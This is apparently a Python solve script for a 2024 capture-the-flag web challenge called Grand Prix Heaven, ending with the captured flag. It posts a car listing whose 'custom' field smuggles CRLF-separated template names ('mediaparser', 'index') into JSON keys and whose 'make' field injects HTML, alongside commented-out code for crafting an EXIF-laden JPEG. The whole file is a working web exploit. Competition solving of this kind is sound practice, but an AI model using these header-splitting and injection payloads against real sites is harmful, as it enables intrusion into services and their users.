#!/usr/bin/env python3

import json
import requests

host = "https://grandprixheaven-web.2024.ctfcompetition.com"
# host = "http://localhost:1337"
baseimg = "img.jpg"
filename = "payload.jpg"
filename = "exif.jpg"

import piexif
from PIL import Image

# img = Image.open(baseimg)
# print(piexif.ExifIFD.UserComment)
# exif_ifd = {
#     piexif.ExifIFD.UserComment: 'my message'.encode(),
#     0x010e: 'my message'.encode(),
#     #24: 'my message'.encode(),
# }
# exif_dict = {"0th": {}, "Exif": exif_ifd, "1st": {},
#          "thumbnail": None, "GPS": {}}
# exif_dat = piexif.dump(exif_dict)
# img.save(filename,  exif=exif_dat)


def main() -> None:
    custom = {
        "1_\r\n\r\nmediaparser\r\n\r\nx": "apiparser",
        "2_": "retrieve",
        "4_": "head_end",
        "5_": "faves",
        "6_": "footer",
    }
    custom = {
        "1_\r\n\r\nmediaparser\r\n\r\nindex\r\n\r\nmediaparser\r\n\r\nx": "apiparser",
        "2_": "retrieve",
        "5_": "faves",
        "6_": "footer",
        "7_": "head_end",
        "8_": "upload_form",
    }
    with open(filename, "rb") as fd:
        multipart = {
            "year": (None, "1984"),
            #"make": (None, "Ferrari"),
            "make": (None, "<html><h1>lol"),
            "model": (None, "F1984"),
            "custom": (None, json.dumps(custom), None),
            "image": ((filename, fd, "image/jpeg")),
        }

        res = requests.post(
            f"{host}/api/new-car", files=multipart, allow_redirects=False
        )
        print(host + res.headers["Location"])


if __name__ == "__main__":
    main()
# https://grandprixheaven-web.2024.ctfcompetition.com/fave/hgAQFN7fnXfGDyVhmtBmG?F1=\media\Uh8rCdp5Nn7Nt-W8GrNgN

# CTF{Car_go_FAST_hEART_Go_FASTER!!!}